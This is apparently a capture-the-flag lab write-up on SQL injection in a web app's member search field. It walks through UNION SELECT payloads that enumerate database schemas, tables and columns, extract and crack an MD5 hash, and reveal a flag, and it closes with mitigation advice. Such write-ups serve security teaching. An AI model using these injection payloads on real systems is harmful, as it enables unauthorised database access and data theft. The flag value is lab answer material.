# SQL Injection In Member Search Field 

## Issue

The input field at "http://{IP}:{PORT}/index.php?page=member" does not sanitize input data which is passed through to a database directly \
resulting in injection of query into SQL database.


## Attack Vector

1 - Navigating to "http://{IP}:{PORT}/index.php?page=member" and entering arbitrary payload eg `' or 1=1` into input field and selecting submit 
reveals SQL syntax error message confirming that data is being passed into query without sanitization

2 - Identify Schemas in database by inputting `4 UNION SELECT null,schema_name from INFORMATION_SCHEMA.SCHEMATA-- -` into the search field and pressing enter \
We see interesting schema `Member_images` \
Note - as there are only 2 columns being returned/rendered by the server during a normal query then union select needs to only reference 2 columns during query!

3 - Identify the tables in `Member_images` schema with `4 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS -- -` which reveals table name `list_images`

4 - Identify all columns in List_images table in Member_images with  `4 UNION SELECT COLUMN_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS -- -`

5 - Column names `id, url, title, comment` are revealed

6 - Query each column in List_images table with `4 UNION SELECT {column_name},{column_name} FROM Member_images.list_images -- -`

7 - After querying all columns we see one particular interest entry in the List_images table as follows:
| **Column name** | id  | url                                   | title   | comment                                                                                         |
|-----------------|-----|---------------------------------------|---------|-------------------------------------------------------------------------------------------------|
| **Data**        | 5   | borntosec.ddns.net/images.png        | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |

8 - Open bash and navigate to script directory. Launch script with `python3 hashcracker.py` to attempt to crack md5 hash against the passwordlist.txt wordlist

9 - The decrypted hash is found to be `albatroz`

10 - We follow the instructions as per table contents and lowercase `albatroz` then apply a SHA256 algorithm to reveal the flag.

11 - Flag is `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

*NOTE - You can use existing MD5 decryption tools such as MD5decrypt.net to attempt to crack the hash.*


## Mitigation

1 - Sanitize and validate input

2 - Use ORM framework to make queries to database

3 - Do not expose raw SQL error messages




